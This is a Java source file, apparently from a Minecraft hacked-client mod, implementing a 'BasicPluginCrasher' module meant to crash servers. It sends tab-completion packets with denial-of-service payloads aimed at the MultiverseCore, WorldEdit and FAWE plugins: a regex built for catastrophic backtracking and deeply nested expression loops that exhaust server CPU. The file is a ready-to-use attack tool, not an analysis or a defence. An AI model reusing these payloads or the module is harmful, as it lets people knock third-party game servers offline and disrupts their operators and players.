package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;

import java.util.ArrayList;
import java.util.List;

public class BasicPluginCrasher extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private boolean enabled = false;
    private String plugin = "WorldEdit";

    public BasicPluginCrasher() {
        super("BasicPluginCrasher", "Crash server with old plugin exploit", true);
    }

    @Override
    public String getArgsUsage() { return "<plugin>"; }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Plugin", OptionType.LIST, new String[]{"FAWE", "MultiverseCore", "WorldEdit"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.plugin = values[0];
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.player == null || mc.getConnection() == null) {
            msgHelper.sendMessage("&cNot connected!", true);
            return;
        }

        msgHelper.sendMessage("&fSending &6" + plugin + " &fexploit...", true);

        switch (plugin) {
            case "MultiverseCore" -> {
                String cmd = "/mvh ('.\"\"+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.++)%";
                mc.getConnection().send(new ServerboundCommandSuggestionPacket(0, cmd));
            }
            case "WorldEdit" -> {
                String cmd = "//EVAL for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}";
                mc.getConnection().send(new ServerboundCommandSuggestionPacket(0, cmd));
            }
            case "FAWE" -> {
                String cmd = "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}";
                mc.getConnection().send(new ServerboundCommandSuggestionPacket(0, cmd));
            }
        }

        msgHelper.sendMessage("&aBasicPluginCrasher sent!", true);
        setEnabled(false);
    }

    @Override
    public boolean getEnabled() { return enabled; }

    @Override
    public void setEnabled(boolean bool) { this.enabled = bool; }
}
